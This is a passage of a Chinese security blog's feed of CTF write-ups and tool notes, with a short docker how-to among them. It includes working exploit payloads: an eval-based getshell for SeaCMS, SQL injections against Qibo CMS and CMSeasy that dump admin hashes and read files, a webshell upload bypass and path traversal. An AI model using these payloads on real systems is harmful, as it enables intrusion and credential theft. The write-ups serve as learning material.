&lt;p&gt;题目地址：&lt;a href=&quot;http://114.55.36.69:8003/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://114.55.36.69:8003/&lt;/a&gt;&lt;br&gt;进去后一个输入框，一个提交&lt;br&gt;&lt;/p&gt;&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="http://black0saturday.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>海洋CMS</title>
    <link href="http://black0saturday.github.io/2018/10/19/%E6%B5%B7%E6%B4%8BCMS/"/>
    <id>http://black0saturday.github.io/2018/10/19/海洋CMS/</id>
    <published>2018-10-19T09:50:17.000Z</published>
    <updated>2019-12-30T10:31:51.367Z</updated>
    
    <content type="html"><![CDATA[<p>复现一个海洋CMS的前台Getshell漏洞，这个漏洞只在版本6.45之前可以用<br><a id="more"></a></p><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>首先在本地搭建好环境，这个比较好弄，先下载网站源码：<br><a href="http://www.seacms.net/forum.php?mod=attachment&amp;aid=Nzg2N3wxYjVjZjc5YXwxNTM5OTQ1NDM0fDB8MQ%3D%3D" target="_blank" rel="noopener">http://www.seacms.net/forum.php?mod=attachment&amp;aid=Nzg2N3wxYjVjZjc5YXwxNTM5OTQ1NDM0fDB8MQ%3D%3D</a><br>下好之后放到<code>/var/www/</code>目录下，然后打开浏览器访问它，按照要求安装可以</p><h3 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01 漏洞分析"></a>0x01 漏洞分析</h3><p><img src="/2018/10/19/%E6%B5%B7%E6%B4%8BCMS/1.png" alt><br>进去后可以看到很大的海洋两个字，记住它的特征，以后看到了这样的页面直接知道用的是海洋CMS<br>然后我们查看一下版本，对这个网站框架熟悉的都知道<code>/data/admin/ver.txt/</code>这个路径可以看到网站的补丁，这样可以看到网站的版本<br><img src="/2018/10/19/%E6%B5%B7%E6%B4%8BCMS/8.png" alt></p><h4 id="漏洞成因："><a href="#漏洞成因：" class="headerlink" title="漏洞成因："></a>漏洞成因：</h4><p>该漏洞成因在于search.php没有对用户输入内容进行过滤，导致攻击者提交的order参数可进入parseIf函数中执行eval。</p><p>官方在6.46版中修复了该漏洞，修复方法是对用户输入的参数进行过滤并限制长度为20个字符。但这种修复方法并没有完全修复漏洞，因为在替换操作过程中用户输入的几个参数可以进行组合，因此补丁被绕过。  </p><h3 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h3><p>在网站的<code>url/search.php</code>文件里有一个漏洞  可以写入一句话，从而getshell<br>直接拿来准备好的POC：<br>    在url后面加上：/search.php?searchtype=5&amp;tid=&amp;area=eval($_POST[123])<br>访问之后一句话就生成了，密码是123</p><p>然后可以用菜刀连接了<br>地址就是：<code>http://127.0.0.1/seacms_A5/search.php?searchtype=5&amp;tid=&amp;area=eval($_POST[123])</code><br>后边的密码是123<br><img src="/2018/10/19/%E6%B5%B7%E6%B4%8BCMS/2.png" alt><br>成功getshell<br><img src="/2018/10/19/%E6%B5%B7%E6%B4%8BCMS/3.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;复现一个海洋CMS的前台Getshell漏洞，这个漏洞只在版本6.45之前可以用&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="CMS" scheme="http://black0saturday.github.io/tags/CMS/"/>
    
  </entry>
  
  <entry>
    <title>docker心得</title>
    <link href="http://black0saturday.github.io/2018/10/05/docker%E5%BF%83%E5%BE%97/"/>
    <id>http://black0saturday.github.io/2018/10/05/docker心得/</id>
    <published>2018-10-05T10:23:32.000Z</published>
    <updated>2019-12-30T10:31:51.361Z</updated>
    
    <content type="html"><![CDATA[<p>最近学校要搞一个安全比赛，需要搭建一个比赛平台，老师要求要用docker，偶不会用docker肿么办，只能学习了，这里做个笔记<br><a id="more"></a></p><p>Docker 要求 Ubuntu 系统的内核版本高于 3.10 ，查看本页面的前提条件来验证你的 Ubuntu 版本是否支持 Docker。</p><p>通过 uname -r 命令查看你当前的内核版本</p><p>然后开始安装docker，安装步骤：</p><ol><li><code>sudo apt-get install -y docker.io</code></li><li>然后查看docker是否安装成功，<code>docker version</code></li><li>启动docker服务 <code>service docker start</code>(停止服务是<code>service docker stop</code>)</li><li>docker安装好了之后就可以使用了，我们先下载镜像，由于我搭建的是web网站，所以这里直接下载一个包含apache和php的镜像 <code>docker pull registry.cn-hangzhou.aliyuncs.com/lxepoo/apache-php5</code></li><li>下载好了之后我们运行并把端口映射出来：<code>docker run -d -p 8080:80 registry.cn-hangzhou.aliyuncs.com/lxepoo/apache-php5</code>  此时会返回一个值，表示该docker的id，以后运行这个容器都要通过这个值<br><img src="/2018/10/05/docker%E5%BF%83%E5%BE%97/1.png" alt></li><li>然后就可以访问<code>127.0.0.1:8080</code>看看是否部署好了</li><li>接下来就是配置我们的网站了，把准备好的网页源代码复制到docker中去：<code>docker cp ./test e664955e:/var/www/</code></li><li>这样就可以访问我们的docker网站了<br>那么做好了之后如何保存呢：可以使用这个命令：<code>docker commit id repository</code>这样就保存下来了  下次再使用可以直接<code>docker run -d -p 8080:80 id</code></li></ol><p>然后如何控制docekr呢，可以用这条命令获得一个shell:<code>docker exec -it e664955e bash</code><br>如何查看本机正在运行的docker有哪些：输入<code>docker ps</code><br>如何查看本机保存的docker镜像：<code>docker images</code><br>如何删除不需要的docker镜像：需要先停止该镜像的docker服务：<code>docker stop id</code>  然后删除<code>docker rmi id</code><br>强制删除容器 <code>docker rmi -f id</code></p><p>如何将docker容器导出成tar包：<br>    docker save -o test.tar 镜像名<br>    docker save &gt; test.tar 镜像名<br>如何使用tar包<br>    docker load -i test.tar<br>    docker load &lt; test.tar</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近学校要搞一个安全比赛，需要搭建一个比赛平台，老师要求要用docker，偶不会用docker肿么办，只能学习了，这里做个笔记&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="docker" scheme="http://black0saturday.github.io/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>再见CMS--齐博CMS</title>
    <link href="http://black0saturday.github.io/2018/09/21/%E5%86%8D%E8%A7%81CMS-%E9%BD%90%E5%8D%9ACMS/"/>
    <id>http://black0saturday.github.io/2018/09/21/再见CMS-齐博CMS/</id>
    <published>2018-09-21T11:50:28.000Z</published>
    <updated>2019-12-30T10:31:51.360Z</updated>
    
    <content type="html"><![CDATA[<p>刚刚在i春秋上做了一道CMS的题，学到的东西挺多的，这里记录一下</p><blockquote><p>题目名称：再见CMS<br>题目内容：这里还是有一个小脑洞<br><a id="more"></a><br>访问链接之后看到的是一个网站，输入<code>url/admin</code>直接就进入了后台（不过这道题没什么用）</p></blockquote><pre><code>渗透CMS网站的三个步骤：        1. 第一步,肯定是要判断出cms类型        2. 第二步,查询该cms曾经出现的漏洞        3. 第三步,然后利用这些漏洞拿到flag.</code></pre><h3 id="0x01-第一步，判断CMS类型："><a href="#0x01-第一步，判断CMS类型：" class="headerlink" title="0x01 第一步，判断CMS类型："></a>0x01 第一步，判断CMS类型：</h3><p>恕我太菜，看了半天也没判断出来是哪种类型，人家说拿最下边的备案号到工信部一查就有网站的信息了，可是我查了一下返回没有匹配到类型，然后看了一下别人的writeup，说是齐博CMS</p><p>知道了CMS类型就要进行第二步了</p><h3 id="0x02-第二步，搜索齐博CMS的漏洞"><a href="#0x02-第二步，搜索齐博CMS的漏洞" class="headerlink" title="0x02 第二步，搜索齐博CMS的漏洞"></a>0x02 第二步，搜索齐博CMS的漏洞</h3><p>百度上一找还是有漏洞的，最典型的就是SQL注入了，接下来我们来看看如何进行注入<br>先注册一个用户，然后登录上去<br>根据搜索出来的文章，漏洞在<code>/member/userinfo.php?job=edit&amp;step=2</code>这个页面，这里存放的是个人信息，我们的注入就是通过构造语句把需要的信息显示在这些个人信息后边：<br><img src="/2018/09/21/%E5%86%8D%E8%A7%81CMS-%E9%BD%90%E5%8D%9ACMS/1.png" alt></p><pre><code>根据网上提供的漏洞利用方法，构造这样一个注入语句：http://ac8bc12353794ed29c196e52eed992b7627b70cb34e54358.game.ichunqiu.com/member/userinfo.php?job=edit&amp;step=2post数据：old_password=123456truename=xxxx%0000&amp;Limitword[000]=&amp;email=123456@qq.com&amp;provinceid=,address=(select version()) where uid=3 %23 </code></pre><p>这个URL其实是对个人信息修改的URL，我们访问这个URL就可以修改个人信息<br>而下边POST的数据就是要修改的东西<br>old_password是旧密码，后边uid是我们访问个人信息页面时URL里给的，重点在address里面，<code>address=</code>，这个后边的值本来应该填写你要修改的新地址的，我们把注入语句放到这里就可以把注入查询到的东西显示在页面的<code>联系地址</code>后边<br><img src="/2018/09/21/%E5%86%8D%E8%A7%81CMS-%E9%BD%90%E5%8D%9ACMS/2.png" alt><br>填好之后访问一下会返回<code>修改成功，页面正在跳转</code><br><img src="/2018/09/21/%E5%86%8D%E8%A7%81CMS-%E9%BD%90%E5%8D%9ACMS/4.png" alt></p><p>然后我们查看一下个人信息，主要看<code>联系地址</code>一栏<br><img src="/2018/09/21/%E5%86%8D%E8%A7%81CMS-%E9%BD%90%E5%8D%9ACMS/5.png" alt></p><p>我们可以看到注入成功了，返回了我们需要的东西，那么就开始注入吧。</p><pre><code>查询数据库：URL:http://ac8bc12353794ed29c196e52eed992b7627b70cb34e54358.game.ichunqiu.com/member/userinfo.php?job=edit&amp;step=2POST:old_password=123456&amp;truename=xxxx%0000&amp;Limitword[000]=&amp;email=test@qq.com&amp;provinceid=,address=(select database()) where uid=3 %23 返回数据库：blog</code></pre><p><img src="/2018/09/21/%E5%86%8D%E8%A7%81CMS-%E9%BD%90%E5%8D%9ACMS/6.png" alt></p><pre><code>查询表:URL:http://ac8bc12353794ed29c196e52eed992b7627b70cb34e54358.game.ichunqiu.com/member/userinfo.php?job=edit&amp;step=2POST:old_password=123456&amp;truename=xxxx%0000&amp;Limitword[000]=&amp;email=test@qq.com&amp;provinceid=,address=(select group_concat(table_name) from information_schema.tables where table_schema=database()) where uid=3 %23 查到了很多的表，但是我觉得就第一个有用：admin</code></pre><p><img src="/2018/09/21/%E5%86%8D%E8%A7%81CMS-%E9%BD%90%E5%8D%9ACMS/7.png" alt><br>    查询列：<br>    URL:<a href="http://ac8bc12353794ed29c196e52eed992b7627b70cb34e54358.game.ichunqiu.com/member/userinfo.php?job=edit&amp;step=2" target="_blank" rel="noopener">http://ac8bc12353794ed29c196e52eed992b7627b70cb34e54358.game.ichunqiu.com/member/userinfo.php?job=edit&amp;step=2</a><br>    POST:old_password=123456&amp;truename=xxxx%0000&amp;Limitword[000]<a href="mailto:=&amp;email=test@qq.com">=&amp;email=test@qq.com</a>&amp;provinceid=,address=(select group_concat(column_name) from information_schema.columns where table_name=0x61646d696e) where uid=3 %23 </p><pre><code>hint:这里由于‘table_name=’的值需要带引号的，但是带了引号语句就报错了，所以利用十六进制来绕过，可以不用带引号返回列：id,username,password,Email</code></pre><p><img src="/2018/09/21/%E5%86%8D%E8%A7%81CMS-%E9%BD%90%E5%8D%9ACMS/8.png" alt></p><pre><code>查询字段：URL:http://ac8bc12353794ed29c196e52eed992b7627b70cb34e54358.game.ichunqiu.com/member/userinfo.php?job=edit&amp;step=2POST:old_password=123456&amp;truename=xxxx%0000&amp;Limitword[000]=&amp;email=test@qq.com&amp;provinceid=,address=(select group_concat(username,password) from admin) where uid=3 %23 返回username:admin   password:2638127c92b79ee7901195382dc08068</code></pre><p><img src="/2018/09/21/%E5%86%8D%E8%A7%81CMS-%E9%BD%90%E5%8D%9ACMS/9.png" alt></p><p>去了各种md5解码网站都查不出来，无奈可能是思路错了</p><p>然后访问了一下<code>url/flag.php</code>,输出了flag is here  那么我们的任务就是查看这个文件了</p><p>如何利用SQL注入查看文件呢？</p><p><a href="https://www.cnblogs.com/blacksunny/p/8060028.html" target="_blank" rel="noopener" title="SQL注入查看文件">https://www.cnblogs.com/blacksunny/p/8060028.html</a></p><p>知道了这个方法我们就来构造payload：</p><pre><code>URL:http://ac8bc12353794ed29c196e52eed992b7627b70cb34e54358.game.ichunqiu.com/member/userinfo.php?job=edit&amp;step=2    POST:old_password=123456&amp;truename=xxxx%0000&amp;Limitword[000]=&amp;email=test@qq.com&amp;provinceid=,address=(select load_file(0x2f7661722f7777772f68746d6c2f666c61672e706870)) where uid=3 %23</code></pre><p>括号里的十六进制是要查看的文件的路径<code>/var/www/html/flag.php</code>，我们可以在主页的最上边看到网站的绝对路径</p><p>访问之后再查看个人信息的联系地址一栏发现是空的，没关系  查看页面源代码<br><img src="/2018/09/21/%E5%86%8D%E8%A7%81CMS-%E9%BD%90%E5%8D%9ACMS/10.png" alt></p><p>这样就得到了flag</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;刚刚在i春秋上做了一道CMS的题，学到的东西挺多的，这里记录一下&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;题目名称：再见CMS&lt;br&gt;题目内容：这里还是有一个小脑洞&lt;br&gt;&lt;/p&gt;&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="CMS" scheme="http://black0saturday.github.io/tags/CMS/"/>
    
  </entry>
  
  <entry>
    <title>Yeser-CMS漏洞利用</title>
    <link href="http://black0saturday.github.io/2018/09/20/Yeser-CMS%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    <id>http://black0saturday.github.io/2018/09/20/Yeser-CMS漏洞利用/</id>
    <published>2018-09-20T09:47:42.000Z</published>
    <updated>2019-12-30T10:31:51.362Z</updated>
    
    <content type="html"><![CDATA[<p>刚刚做了一道“百度杯”CTF比赛 九月场中的CMS题目，这里拿出来分享一下</p><blockquote><p>题目内容：新的CMS系统，帮忙测测是否有漏洞。<br>tips:flag在网站根目录下的flag.php中</p></blockquote><a id="more"></a><p>首先去百度了一下，是没有这个cms的，那么看一下这个网站看有没有有用的信息<br>我看先看一下这个文件：<code>http://0b572aacb0994d6fb941349a346cae04c9d7fafc8afd42b6.game.ichunqiu.com/robots.txt</code><br>这个文件的作用是告诉我们哪些网站能爬，哪些不饿能爬，不过它里面有时候会放一些重要的东西</p><p>页面显示如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#</span><br><span class="line"># robots.txt for YeserCMS</span><br><span class="line"># Version 5.0.0</span><br><span class="line">#</span><br><span class="line"></span><br><span class="line">User-agent: *</span><br><span class="line"></span><br><span class="line">Disallow:&#x2F;admin&#x2F;</span><br><span class="line">Disallow:&#x2F;cache&#x2F;</span><br><span class="line">Disallow:&#x2F;common&#x2F;</span><br><span class="line">Disallow:&#x2F;config&#x2F;</span><br><span class="line">Disallow:&#x2F;fckeditor&#x2F;</span><br><span class="line">Disallow:&#x2F;htaccess&#x2F;</span><br><span class="line">Disallow:&#x2F;images&#x2F;</span><br><span class="line">Disallow:&#x2F;install&#x2F;</span><br><span class="line">Disallow:&#x2F;js&#x2F;</span><br><span class="line">Disallow:&#x2F;lib&#x2F;</span><br><span class="line">Disallow:&#x2F;template&#x2F;</span><br><span class="line">Disallow:&#x2F;upload&#x2F;</span><br><span class="line">Disallow:&#x2F;celive&#x2F;</span><br><span class="line">Disallow:flag.php</span><br></pre></td></tr></table></figure><br>可以好几个比较重要的目录和文件</p><p>先放到这，然后我们继续寻找有用的信息<br>在文档下载页面，随便点一个文档进去，拉到最下面的评论区可以在我要评论里面看到网站的框架是CMSEASY<br><img src="/2018/09/20/Yeser-CMS%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/1.png" alt></p><pre><code>百度了一下CMSeasy，发现这确实是一个CMS，而且是有漏洞的https://www.seebug.org/appdir/CmsEasy使用无限制报错注入https://www.seebug.org/vuldb/ssvid-94084</code></pre><p>这个网站存在报错注入，大概思路就是：<br>通过报错注入获得管理员用户名和密码<br>然后通过上边的<code>robots.txt</code>我们可以看到后台目录是：<code>/admin/</code><br>我们直接登陆后台，漏洞在后台页面上</p><p>接下来的问题就是如何获得用户名和密码，通过上边这篇文档提供的方法，直接把payload拿来用了：<br>存在注入漏洞的页面是：<code>url/celive/live/header.php</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">那么我们访问这个页面，同时postdata:xajax&#x3D;Postdata&amp;xajaxargs[0]&#x3D;&lt;xjxquery&gt;&lt;q&gt;detail&#x3D;xxxxxx&#39;,(UpdateXML(1,CONCAT(0x5b,substring((SELECT&#x2F;**&#x2F;GROUP_CONCAT(username,password) from yesercms_user),1,32),0x5d),1)),NULL,NULL,NULL,NULL,NULL,NULL)-- &lt;&#x2F;q&gt;&lt;&#x2F;xjxquery&gt;</span><br></pre></td></tr></table></figure><br>这样确实得到了回显，有用户名，但是密码好像是不全的<br><img src="/2018/09/20/Yeser-CMS%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/2.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">接下来直接只查看完整的密码的md5</span><br><span class="line">xajax&#x3D;Postdata&amp;xajaxargs[0]&#x3D;&lt;xjxquery&gt;&lt;q&gt;detail&#x3D;xxxxxx%2527%252c(UpdateXML(1%252cCONCAT(0x5b%252csubstring((SELECT%252f**%252fGROUP_CONCAT(username%252cpassword)%2bfrom%2byesercms_user)%252c7%252c39)%252c0x5d)%252c1))%252cNULL%252cNULL%252cNULL%252cNULL%252cNULL%252cNULL)--%2b&lt;&#x2F;q&gt;&lt;&#x2F;xjxquery&gt;</span><br><span class="line"></span><br><span class="line">页面返回如下</span><br><span class="line">XPATH syntax error: &#39;[f512d4240cbbdeafada404677ccbe61&#39;&lt;br &#x2F;&gt;&lt;br &#x2F;&gt;INSERT INTO &#96;yesercms_detail&#96; (&#96;chatid&#96;,&#96;detail&#96;,&#96;who_witter&#96;) VALUES(&#39;&#39;,&#39;xxxxxx&#39;,(UpdateXML(1,CONCAT(0x5b,substring((SELECT&#x2F;**&#x2F;GROUP_CONCAT(username,password) from yesercms_user),7,39),0x5d),1)),NULL,NULL,NULL,NULL,NULL,NULL)--  (2018-08-13 16:22:21)&#39;,&#39;2&#39;)</span><br></pre></td></tr></table></figure><p><img src="/2018/09/20/Yeser-CMS%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/3.png" alt><br>然后就知道了</p><pre><code>用户名admin，密码ff512d4240cbbdeafada404677ccbe61，md5解密为Yeser231。</code></pre><p>这里推荐一个md5在线解码网站，可以直接解出来这个值：<code>http://www.dmd5.com/md5-decrypter.jsp</code><br>然后我们就可以进入后台了，在后台直接登陆就行</p><p><img src="/2018/09/20/Yeser-CMS%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/4.png" alt></p><p>登陆后就进入了后台<br>还是查看的别人的文章，CMSeasy在后台有一个任意文件查看的漏洞<br>我们点击<code>模板</code>，然后选择<code>当前模板编辑</code>，然后抓个包，点击编辑<br><img src="/2018/09/20/Yeser-CMS%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/5.png" alt><br><img src="/2018/09/20/Yeser-CMS%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/6.png" alt><br><img src="/2018/09/20/Yeser-CMS%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/7.png" alt><br>在包的最下边会看到：<code>&amp;id=#footer_html</code>这个东西<br><img src="/2018/09/20/Yeser-CMS%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/8.png" alt></p><p>把它修改成<code>&amp;id=../../flag.php</code><br>这就是任意文件查看漏洞<br>之后发送包，我们要的flag就出来了<br><img src="/2018/09/20/Yeser-CMS%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/9.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;刚刚做了一道“百度杯”CTF比赛 九月场中的CMS题目，这里拿出来分享一下&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;题目内容：新的CMS系统，帮忙测测是否有漏洞。&lt;br&gt;tips:flag在网站根目录下的flag.php中&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="CMS" scheme="http://black0saturday.github.io/tags/CMS/"/>
    
  </entry>
  
  <entry>
    <title>神器dvcs-ripper</title>
    <link href="http://black0saturday.github.io/2018/09/11/%E7%A5%9E%E5%99%A8dvcs-ripper/"/>
    <id>http://black0saturday.github.io/2018/09/11/神器dvcs-ripper/</id>
    <published>2018-09-11T07:27:24.000Z</published>
    <updated>2020-04-01T09:03:09.990Z</updated>
    
    <content type="html"><![CDATA[<p>刚刚做了一道题，发现一个神器，分享出来。<br>做那个题目的时候扫描目录发现有一个.svn目录，然后百度了一下这个东西，发现有一个神器叫dvcs-ripper，这个东西可以对.svn目录进行操作，把.svn里的数据恢复，这样我们就可以看到源码。<br>简单点来说它的功能就是源码泄露。<br><a id="more"></a></p><p>工具的地址：<code>https://github.com/kost/dvcs-ripper</code></p><p>我是在linux系统下使用的，下载好解压后可以看到这几个目录：</p><p><img src="/2018/09/11/%E7%A5%9E%E5%99%A8dvcs-ripper/1.png" alt></p><p>获取.svn就用rip-svn.pl工具</p><p>命令如下（这里我以i春秋上的一道题目为例）：<br>    perl rip-svn.pl -v -u <a href="http://120.132.56.20:1515/.svn/" target="_blank" rel="noopener">http://120.132.56.20:1515/.svn/</a></p><p>执行完之后得到的数据：</p><p><img src="/2018/09/11/%E7%A5%9E%E5%99%A8dvcs-ripper/2.png" alt></p><p>暂时就测试了这个功能，以后再发现会继续分享。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;刚刚做了一道题，发现一个神器，分享出来。&lt;br&gt;做那个题目的时候扫描目录发现有一个.svn目录，然后百度了一下这个东西，发现有一个神器叫dvcs-ripper，这个东西可以对.svn目录进行操作，把.svn里的数据恢复，这样我们就可以看到源码。&lt;br&gt;简单点来说它的功能就是源码泄露。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="随笔" scheme="http://black0saturday.github.io/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>神器Githack</title>
    <link href="http://black0saturday.github.io/2018/09/10/%E7%A5%9E%E5%99%A8Githack/"/>
    <id>http://black0saturday.github.io/2018/09/10/神器Githack/</id>
    <published>2018-09-10T13:30:01.000Z</published>
    <updated>2020-04-01T09:03:24.048Z</updated>
    
    <content type="html"><![CDATA[<p>GitHack是一个.git泄露利用测试脚本，通过泄露的文件，还原重建工程源代码，是用python2写的。</p><h3 id="漏洞原因：当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当，可能会将-git文件夹直接部署到线上环境。这就引起了git泄露漏洞。"><a href="#漏洞原因：当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当，可能会将-git文件夹直接部署到线上环境。这就引起了git泄露漏洞。" class="headerlink" title="漏洞原因：当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当，可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。"></a>漏洞原因：当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当，可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。</h3><p>Git信息泄露的危害很大，渗透测试人员、攻击者，可直接从源码获取敏感配置信息（如：邮箱，数据库），也可以进一步审计代码，挖掘文件上传、SQL注入等安全漏洞。</p><a id="more"></a><p>那么Githack漏洞工作原理是什么？</p><pre><code>1、解析.git/index文件，找到工程中所有的： ( 文件名，文件sha1 )2、去.git/objects/ 文件夹下下载对应的文件3、zlib解压文件，按原始的目录结构写入源代码</code></pre><p>其实我们搞安全的可以不用管原理是什么，我们只需要会使用它：</p><h3 id="用法示例："><a href="#用法示例：" class="headerlink" title="用法示例："></a>用法示例：</h3><pre><code>python2 GitHack.py http://www.openssl.org/.git/</code></pre><p>它是用python2写的，所以要用python2来运行，运行的时候千万不要把.py文件单独弄出来（会报错的）。一定要进入Githack目录下。</p><p>运行完之后就可以在当前目录下看到已经生成了一个文件夹，里面有源代码和其它的东西。</p><pre><code>### 获取地址：https://github.com/lijiejie/GitHack</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;GitHack是一个.git泄露利用测试脚本，通过泄露的文件，还原重建工程源代码，是用python2写的。&lt;/p&gt;
&lt;h3 id=&quot;漏洞原因：当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当，可能会将-git文件夹直接部署到线上环境。这就引起了git泄露漏洞。&quot;&gt;&lt;a href=&quot;#漏洞原因：当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当，可能会将-git文件夹直接部署到线上环境。这就引起了git泄露漏洞。&quot; class=&quot;headerlink&quot; title=&quot;漏洞原因：当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当，可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。&quot;&gt;&lt;/a&gt;漏洞原因：当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当，可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。&lt;/h3&gt;&lt;p&gt;Git信息泄露的危害很大，渗透测试人员、攻击者，可直接从源码获取敏感配置信息（如：邮箱，数据库），也可以进一步审计代码，挖掘文件上传、SQL注入等安全漏洞。&lt;/p&gt;
    
    </summary>
    
    
      <category term="随笔" scheme="http://black0saturday.github.io/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>i春秋CTF</title>
    <link href="http://black0saturday.github.io/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/"/>
    <id>http://black0saturday.github.io/2018/09/06/i春秋CTF/</id>
    <published>2018-09-06T10:48:38.000Z</published>
    <updated>2019-12-30T10:31:51.369Z</updated>
    
    <content type="html"><![CDATA[<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="1-broken"><a href="#1-broken" class="headerlink" title="1. broken"></a>1. broken</h3><p>题目链接：<a href="http://106.75.72.168:1111/" target="_blank" rel="noopener" title="broken">http://106.75.72.168:1111/</a></p><p>进入链接看到一串代码，目测是jsfuck。</p><a id="more"></a><p>代码太多，这里就不放出来了</p><p>打开浏览器，按F12，把代码放到console里面跑一下报错了，联想到题目给的broken想到有可能是代码不全，经过观察发现第一个[括号没有对应的右括号，在末尾加上一个右括号，再把结尾的()去掉<br>直接得到一个Array:<code>Array [ &quot;var flag=\&quot;flag{f_f_l_u_a_c_g_k}\&quot;;alert(&#39;flag is not here&#39;);&quot; ]</code></p><p><img src="/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/1.png" alt></p><h3 id="2-Do-you-know-upload？"><a href="#2-Do-you-know-upload？" class="headerlink" title="2. Do you know upload？"></a>2. Do you know upload？</h3><p>根据题目推测是文件上传，先上传一个jpg显示上传成功，上传一个php显示上传失败，那么写一个一句话木马放到php文件里。<img src="/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/2.png" alt><br>上传的时候用burpsuite抓个包然后把Content-Type字段改成image/jpeg<br>提示上传成功，并给出了路径<img src="/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/3.png" alt><br><img src="/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/4.png" alt></p><p>菜刀连上之后并没有找到flag文件，推测是不是在ctf数据库里面，那么看一下数据库配置文件config.php，看到了数据库账号密码<br><img src="/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/5.png" alt><br>编辑菜刀连接数据库上去拿到flag<br><img src="/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/6.png" alt><br><img src="/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/7.png" alt></p><h3 id="3-wanna-to-see-your-hat"><a href="#3-wanna-to-see-your-hat" class="headerlink" title="3.wanna to see your hat?"></a>3.wanna to see your hat?</h3><p>题目地址：<code>http://120.132.56.20:1515/</code><br>进入题目后是一堆帽子，往下拉有一个链接<code>I want to check the color of my hat!</code></p><p>点进去这个链接发现有一个提交框</p><p><img src="/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/8.png" alt></p><p>随便输一个提交进去发现页面直接跳转了，跳转到的那个页面又是一堆帽子，没什么意义。</p><p>那么这道题的关键应该就在这个提交框了，回到<code>http://120.132.56.20:1515/route.php?act=login</code>页面</p><p>为了防止页面跳转，我们用抓包来抓取页面</p><p>抓取到的页面和网页的回应如下</p><p><img src="/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/9.png" alt></p><p>从网页的返回可以看到一行sql语句，初步判定这道题用的应该是sql注入，然后我们在name字段随便输入一个值，后边加上单引号，可以看到页面返回如下。</p><p><img src="/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/10.png" alt></p><p>通过分析我们发现页面把我们输入的单引号替换成了反斜杠，那么我们如果在末尾加上了单引号原本sql语句末的单引号就被转移掉了，通过测试和分析发现空格也被过滤掉了，这里脑部一下在sql语句中注释符是可以代替空格的，这里就用<code>/**/</code>来代替空格，最后总结出来payload:<code>or/**/1#1&#39;</code></p><p>页面返回如下</p><p><img src="/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/11.png" 